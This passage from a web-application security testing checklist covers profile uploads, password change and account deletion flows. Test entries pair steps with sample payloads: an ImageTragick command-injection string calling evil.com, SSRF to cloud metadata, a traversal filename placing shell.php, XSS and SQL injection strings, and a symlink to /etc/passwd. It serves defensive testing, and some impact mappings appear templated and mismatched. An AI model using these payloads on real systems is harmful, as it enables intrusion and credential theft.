**Expected Result:** Application should use updated ImageMagick with policy restrictions

**Payload Example:**

```
push graphic-context\nviewbox 0 0 640 480\nfill 'url(https://evil.com/image.jpg"|ls "-la)'
```

**Impact:** Code/command execution -&gt; full server compromise.

**Tools:** ImageTragick / Burp Suite

**References:** CWE-94; -&gt;[Command Injection checklist](#/checklist/cmdi); PortSwigger; OWASP

---

## PROF-042 — SSRF via Image URL
**Test Category:** Server-Side Request Forgery · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Avatar / Profile Picture Upload - avatar upload: filename / content-type / bytes

**Test Steps:** 1. Find image URL upload feature 2. Provide internal URL 3. Check for internal resource access

**Expected Result:** Application should validate and restrict URL targets

**Payload Example:**

```
http://localhost/admin or http://169.254.169.254/
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite / SSRFmap

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## PROF-043 — Path Traversal in Upload Filename
**Test Category:** Path Traversal · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Avatar / Profile Picture Upload - avatar upload: filename / content-type / bytes

**Test Steps:** 1. Upload file with path traversal in filename 2. Check file storage location

**Expected Result:** Application should sanitize filenames

**Payload Example:**

```
filename="../../../var/www/html/shell.php"
```

**Impact:** Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE.

**Tools:** Burp Suite / DotDotPwn

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai

---

## PROF-044 — Polyglot File Upload
**Test Category:** File Upload Vulnerabilities · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Avatar / Profile Picture Upload - avatar upload: filename / content-type / bytes

**Test Steps:** 1. Create polyglot file (valid image + executable) 2. Upload and access 3. Check for dual interpretation

**Expected Result:** Application should not allow dual-purpose files

**Payload Example:**

```
JPEG file with embedded PHP in EXIF/comments
```

**Impact:** Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling.

**Tools:** Burp Suite / ExifTool / polyglot-maker

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger File upload; ImageTragick

---

## PROF-045 — File Size DoS
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Avatar / Profile Picture Upload - avatar upload: filename / content-type / bytes

**Test Steps:** 1. Upload extremely large file 2. Monitor server resources 3. Check for service degradation

**Expected Result:** Application should enforce file size limits

**Payload Example:**

```
Upload 1GB+ file
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite / curl / wget

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## PROF-046 — Zip Bomb Upload
**Test Category:** Denial of Service · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Avatar / Profile Picture Upload - avatar upload: filename / content-type / bytes

**Test Steps:** 1. Upload zip bomb file 2. Trigger server-side extraction 3. Monitor for disk exhaustion

**Expected Result:** Application should limit decompression ratio

**Payload Example:**

```
42.zip or similar recursive archive
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite / zip-bomb-generator

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## PROF-047 — Metadata Injection in Images
**Test Category:** Information Disclosure/XSS · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Avatar / Profile Picture Upload - avatar upload: filename / content-type / bytes

**Test Steps:** 1. Upload image with malicious EXIF data 2. Check if metadata displayed 3. Test for XSS in metadata

**Expected Result:** Application should strip or sanitize metadata

**Payload Example:**

```
EXIF comment with <script> tag
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** ExifTool / Burp Suite

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## PROF-048 — Race Condition in File Upload
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Avatar / Profile Picture Upload - avatar upload: filename / content-type / bytes

**Test Steps:** 1. Upload file and quickly access before processing 2. Try to execute before validation completes

**Expected Result:** Application should validate before making files accessible

**Payload Example:**

```
Rapid upload and access requests
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder / Race-The-Web

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## PROF-049 — Stored XSS via File Name
**Test Category:** Cross-Site Scripting · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Avatar / Profile Picture Upload - avatar upload: filename / content-type / bytes

**Test Steps:** 1. Upload file with XSS payload in filename 2. View file listing 3. Check for XSS execution

**Expected Result:** Application should sanitize displayed filenames

**Payload Example:**

```
<script>alert('XSS')</script>.jpg
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## PROF-050 — PDF Upload with JavaScript
**Test Category:** Cross-Site Scripting · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Avatar / Profile Picture Upload - avatar upload: filename / content-type / bytes

**Test Steps:** 1. Create PDF with embedded JavaScript 2. Upload as profile document 3. Open PDF and observe execution

**Expected Result:** Application should sanitize or restrict PDF uploads

**Payload Example:**

```
PDF with /JavaScript /JS (alert('XSS'))
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / PDF Tools

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## PROF-051 — HTML File Upload
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Avatar / Profile Picture Upload - avatar upload: filename / content-type / bytes

**Test Steps:** 1. Upload HTML file as avatar 2. Access uploaded file 3. Check if rendered as HTML

**Expected Result:** Application should not serve HTML with text/html type

**Payload Example:**

```
<html><script>alert(1)</script></html>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / Browser

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## PROF-052 — Symlink Upload Attack
**Test Category:** Path Traversal · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Avatar / Profile Picture Upload - avatar upload: filename / content-type / bytes

**Test Steps:** 1. Create archive with symlink to sensitive file 2. Upload and trigger extraction 3. Access extracted symlink

**Expected Result:** Application should not follow symlinks in uploads

**Payload Example:**

```
tar with symlink to /etc/passwd
```

**Impact:** Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE.

**Tools:** Burp Suite / tar

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai

---

## PROF-053 — IDOR in File Access
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Avatar / Profile Picture Upload - avatar upload: filename / content-type / bytes

**Test Steps:** 1. Upload avatar and note URL pattern 2. Modify identifier to access other users' uploads

**Expected Result:** Application should authorize file access

**Payload Example:**

```
/uploads/user_12345/avatar.jpg -> user_12346
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / ffuf

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## PROF-054 — Insecure File Permissions
**Test Category:** Security Misconfiguration · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Avatar / Profile Picture Upload - avatar upload: filename / content-type / bytes

**Test Steps:** 1. Upload file 2. Check file permissions on server 3. Verify no world-readable sensitive files

**Expected Result:** Uploaded files should have restricted permissions

**Payload Example:**

```
Check 777 or world-readable permissions
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Burp Suite / SSH Access

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## PROF-055 — Content Sniffing Attack
**Test Category:** Security Misconfiguration · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Avatar / Profile Picture Upload - avatar upload: filename / content-type / bytes

**Test Steps:** 1. Upload file with ambiguous content 2. Check Content-Type header in response 3. Verify X-Content-Type-Options

**Expected Result:** Application should set X-Content-Type-Options: nosniff

**Payload Example:**

```
File that browsers may sniff as HTML
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## PROF-056 — IDOR on Cover Photo Upload
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Cover Photo - cover-photo upload: filename / content-type / bytes

**Test Steps:** 1. Upload cover photo 2. Capture request and modify user ID 3. Upload to another user's profile

**Expected Result:** Application should verify ownership before upload

**Payload Example:**

```
POST /api/user/victim_id/cover-photo
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## PROF-057 — Large Image DoS
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Cover Photo - cover-photo upload: filename / content-type / bytes

**Test Steps:** 1. Upload extremely high resolution image 2. Trigger server-side processing 3. Monitor resource usage

**Expected Result:** Application should limit image dimensions

**Payload Example:**

```
Image with 50000x50000 pixel dimensions
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** ImageMagick / Burp Suite

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## PROF-058 — SSRF via Image Processing
**Test Category:** Server-Side Request Forgery · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Cover Photo - cover-photo upload: filename / content-type / bytes

**Test Steps:** 1. Upload image with embedded URL 2. Check if server fetches external resources during processing

**Expected Result:** Application should not fetch external resources

**Payload Example:**

```
SVG with external reference or SSRF in resize URL
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite / SSRFmap

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## PROF-059 — Pixel Flood Attack
**Test Category:** Denial of Service · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Cover Photo - cover-photo upload: filename / content-type / bytes

**Test Steps:** 1. Create image with malicious pixel dimensions in header 2. Upload and trigger processing 3. Monitor memory usage

**Expected Result:** Application should validate dimensions before allocation

**Payload Example:**

```
Small file with huge dimensions in header
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Custom Script / Burp Suite

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## PROF-060 — Stored XSS in Image Alt Text
**Test Category:** Cross-Site Scripting · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Cover Photo - cover-photo upload: filename / content-type / bytes

**Test Steps:** 1. Upload cover photo 2. Set alt text/title with XSS payload 3. View profile

**Expected Result:** Application should sanitize alt text

**Payload Example:**

```
alt="<script>alert('XSS')</script>"
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## PROF-061 — Cover Photo Deletion IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Cover Photo - cover-photo upload: filename / content-type / bytes

**Test Steps:** 1. Delete own cover photo 2. Capture request 3. Modify to delete another user's photo

**Expected Result:** Application should verify ownership on deletion

**Payload Example:**

```
DELETE /api/user/victim_id/cover-photo
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## PROF-062 — Password Change Without Current Password
**Test Category:** Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Change Password - change-password form: old/new password, re-auth

**Test Steps:** 1. Navigate to password change 2. Check if current password required 3. Try changing without current password

**Expected Result:** Application should require current password verification

**Payload Example:**

```
POST /change-password without old_password field
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Postman

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## PROF-063 — CSRF on Password Change
**Test Category:** Cross-Site Request Forgery · **Severity:** Critical · **CVSS:** 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** Change Password - change-password form: old/new password, re-auth

**Test Steps:** 1. Create malicious page with password change form 2. Trick victim to visit 3. Check if password changed

**Expected Result:** Application should require CSRF token and current password

**Payload Example:**

```
<form action="/change-password" method="POST">
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite CSRF PoC / Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## PROF-064 — Password Change Rate Limiting Bypass
**Test Category:** Broken Authentication · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Change Password - change-password form: old/new password, re-auth

**Test Steps:** 1. Attempt multiple password changes rapidly 2. Try different headers to bypass rate limiting 3. Test from multiple IPs

**Expected Result:** Application should implement robust rate limiting

**Payload Example:**

```
X-Forwarded-For: 127.0.0.1 variations
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite Intruder / IP Rotate

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## PROF-065 — Weak Password Policy Bypass
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Change Password - change-password form: old/new password, re-auth

**Test Steps:** 1. Try setting weak passwords 2. Test minimum length bypass 3. Check for complexity requirements

**Expected Result:** Application should enforce strong password policy

**Payload Example:**

```
123456 or password or single character
```

**Impact:** Weak password policy -&gt; trivial brute force / credential-stuffing success -&gt; ATO.

**Tools:** Burp Suite / Password Lists

**References:** CWE-521; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-07; NIST 800-63B

---

## PROF-066 — Password History Bypass
**Test Category:** Broken Authentication · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Change Password - change-password form: old/new password, re-auth

**Test Steps:** 1. Change password to new value 2. Immediately try to change back to old password 3. Test password history enforcement

**Expected Result:** Application should prevent password reuse

**Payload Example:**

```
Cycle through old passwords
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Postman

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## PROF-067 — Password Reset Token Reuse
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Change Password - change-password form: old/new password, re-auth

**Test Steps:** 1. Request password reset 2. Use token to change password 3. Try using same token again

**Expected Result:** Tokens should be single-use

**Payload Example:**

```
Resubmit same reset token
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Postman

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## PROF-068 — Password Reset Token Prediction
**Test Category:** Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Change Password - change-password form: old/new password, re-auth

**Test Steps:** 1. Request multiple reset tokens 2. Analyze token patterns 3. Predict future tokens

**Expected Result:** Tokens should be cryptographically random

**Payload Example:**

```
Sequential or timestamp-based tokens
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite Sequencer / Custom Scripts

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## PROF-069 — Password Brute Force
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Change Password - change-password form: old/new password, re-auth

**Test Steps:** 1. Attempt multiple password guesses 2. Check for account lockout 3. Test lockout bypass

**Expected Result:** Application should lock account after failed attempts

**Payload Example:**

```
Common password wordlist
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite Intruder / Hydra / Medusa

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## PROF-070 — Password Change Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Change Password - change-password form: old/new password, re-auth

**Test Steps:** 1. Insert SQL/NoSQL payload in password fields 2. Check for injection vulnerabilities

**Expected Result:** Application should use parameterized queries

**Payload Example:**

```
new_password=' OR '1'='1
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## PROF-071 — Password Disclosure in Response
**Test Category:** Information Disclosure · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Change Password - change-password form: old/new password, re-auth

**Test Steps:** 1. Change password 2. Check response for password echo 3. Check logs and error messages

**Expected Result:** Password should never be returned in response

**Payload Example:**

```
Check for password in JSON response
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## PROF-072 — Session Invalidation After Password Change
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Change Password - change-password form: old/new password, re-auth

**Test Steps:** 1. Login on multiple devices 2. Change password on one device 3. Check other sessions

**Expected Result:** Other sessions should be invalidated

**Payload Example:**

```
Check if old sessions still work
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Multiple Browsers

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## PROF-073 — Clickjacking on Password Change
**Test Category:** UI Redressing · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Change Password - change-password form: old/new password, re-auth

**Test Steps:** 1. Create page that iframes password change form 2. Overlay with fake UI 3. Trick user to change password

**Expected Result:** Application should implement X-Frame-Options

**Payload Example:**

```
Invisible iframe over button
```

**Impact:** Clickjacking of a sensitive action -&gt; UI-redress-driven state change.

**Tools:** Burp Suite Clickbandit / Custom HTML

**References:** CWE-1021; -&gt;[CSRF checklist](#/checklist/csrf); OWASP Clickjacking; PortSwigger

---

## PROF-074 — Password Change via GET Request
**Test Category:** Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Change Password - change-password form: old/new password, re-auth

**Test Steps:** 1. Check if password change accepts GET 2. Test for URL parameter password change

**Expected Result:** Password change should only accept POST

**Payload Example:**

```
GET /change-password?new_password=hacked
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Burp Suite / Browser

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## PROF-075 — Timing Attack on Password Verification
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Change Password - change-password form: old/new password, re-auth

**Test Steps:** 1. Measure response time for correct vs incorrect current password 2. Identify timing differences

**Expected Result:** Response time should be constant

**Payload Example:**

```
Statistical timing analysis
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## PROF-076 — IDOR on Account Deletion
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Account Deactivation / Deletion - deactivate/delete endpoint (userId)

**Test Steps:** 1. Initiate account deletion 2. Capture request 3. Modify user ID to delete another account

**Expected Result:** Application should verify ownership

**Payload Example:**

```
DELETE /api/user/victim_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## PROF-077 — CSRF on Account Deletion
**Test Category:** Cross-Site Request Forgery · **Severity:** Critical · **CVSS:** 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** Account Deactivation / Deletion - deactivate/delete endpoint (userId)

**Test Steps:** 1. Create malicious page with delete request 2. Trick victim to visit 3. Check if account deleted

**Expected Result:** Application should require CSRF token and confirmation

**Payload Example:**

```
<form action="/delete-account" method="POST">
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite CSRF PoC / Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## PROF-078 — Account Deletion Without Authentication
**Test Category:** Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Account Deactivation / Deletion - deactivate/delete endpoint (userId)

**Test Steps:** 1. Capture deletion request 2. Try without session cookie 3. Test with expired session

**Expected Result:** Deletion should require valid authentication

**Payload Example:**

```
Request without Authorization header
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Postman

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## PROF-079 — Account Recovery After Deletion
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Account Deactivation / Deletion - deactivate/delete endpoint (userId)

**Test Steps:** 1. Delete account 2. Attempt to recover using email 3. Check if data still accessible

**Expected Result:** Deleted accounts should not be recoverable without proper process

**Payload Example:**

```
Password reset on deleted account
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Email

**References:** CWE-840; PortSwigger Business logic

---

## PROF-080 — Incomplete Data Deletion
**Test Category:** Privacy Violation · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Account Deactivation / Deletion - deactivate/delete endpoint (userId)

**Test Steps:** 1. Delete account 2. Check if data persists in backups/logs 3. Verify complete removal

**Expected Result:** All user data should be permanently removed

**Payload Example:**

```
Search for user data in API responses
```

**Impact:** Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience.

**Tools:** Burp Suite / Database Access

**References:** CWE-359; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Privacy Risks; GDPR

---

## PROF-081 — Deletion Confirmation Bypass
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Account Deactivation / Deletion - deactivate/delete endpoint (userId)

**Test Steps:** 1. Initiate deletion without confirmation 2. Bypass email/SMS verification 3. Force delete

**Expected Result:** Deletion should require multi-step confirmation

**Payload Example:**

```
Skip confirmation step in request
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## PROF-082 — Race Condition on Deletion
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Account Deactivation / Deletion - deactivate/delete endpoint (userId)

**Test Steps:** 1. Send concurrent deletion and data access requests 2. Check for race condition 3. Access data during deletion

**Expected Result:** Deletion should be atomic

**Payload Example:**

```
Parallel DELETE and GET requests
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder / Burp Suite

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## PROF-083 — Reactivation of Deleted Account
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Account Deactivation / Deletion - deactivate/delete endpoint (userId)

**Test Steps:** 1. Delete account 2. Attempt to register with same email 3. Check if old data restored

**Expected Result:** Deleted account data should not be recoverable

**Payload Example:**

```
Register with deleted email
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-840; PortSwigger Business logic

---

## PROF-084 — Soft Delete Data Exposure
**Test Category:** Information Disclosure · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Account Deactivation / Deletion - deactivate/delete endpoint (userId)

**Test Steps:** 1. Delete account 2. Check if soft-deleted data accessible via API 3. Test different endpoints

**Expected Result:** Soft-deleted data should not be accessible

